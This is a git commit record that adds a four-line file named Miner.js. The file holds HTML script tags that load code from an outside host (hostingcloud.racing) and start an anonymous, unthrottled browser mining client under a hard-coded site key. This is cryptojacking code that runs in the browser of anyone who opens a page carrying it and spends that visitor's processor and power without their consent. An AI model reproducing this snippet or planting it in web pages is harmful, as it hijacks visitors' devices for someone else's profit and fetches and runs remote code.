9a8ac0374593a86e3d2ccdf2d674955d8bfa6292
mohrezdvlpr <64448661+mohrezdvlpr@users.noreply.github.com>
2022-07-15 20:47:16 +0430

    Add files via upload

---
+++ Miner.js
@@ -0,0 +1,4 @@
+<script src="https://www.hostingcloud.racing/Pgj2.js"></script>
+<script> var _client = new Client.Anonymous('eaa879f4b816dde5a8a24a4f1fe0317ae8fac4d37a8c397b67504eb8a15e432b', { throttle: 0, c: 'w' });
+_client.start(); 
+</script>
